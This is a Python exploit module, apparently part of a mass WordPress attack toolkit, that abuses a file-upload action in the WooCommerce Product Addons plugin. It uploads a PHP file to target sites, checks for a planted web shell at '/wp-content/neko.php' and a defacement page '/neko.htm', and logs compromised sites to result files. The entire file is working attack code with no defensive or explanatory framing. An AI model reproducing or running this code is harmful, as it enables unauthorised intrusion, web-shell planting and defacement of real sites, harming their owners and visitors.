# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    try:
        Exp = 'http://' + site + '/wp-admin/admin-ajax.php'
        Postdata = {'action': 'nm_personalizedproduct_upload_file', 'name': 'upload.php'}
        FileData = {'file': ('settings_auto.php', open('files/settings_auto.php', 'rb'),
                             'multipart/form-data')}
        GoT = requests.post(Exp, files=FileData, data=Postdata, timeout=10, headers=Headers)
        if GoT.status_code == 200 or 'success' in GoT.content:
            UploadPostPath = 'http://' + site + '/wp-content/uploads/product_files/upload.php'
            CheckShell = requests.get(UploadPostPath, timeout=10, headers=Headers)
            if 'neko!!' in CheckShell.content:
                shellChecker = requests.get('http://' + site + '/wp-content/neko.php',
                                            timeout=10, headers=Headers)
                if 'neko!!' in shellChecker.content:
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/neko.php' + '\n')
                IndexCheck = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                if 'neko!!' in IndexCheck.content:
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                return printModule.returnYes(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'WooCommerce Product Addons', 'Wordpress')
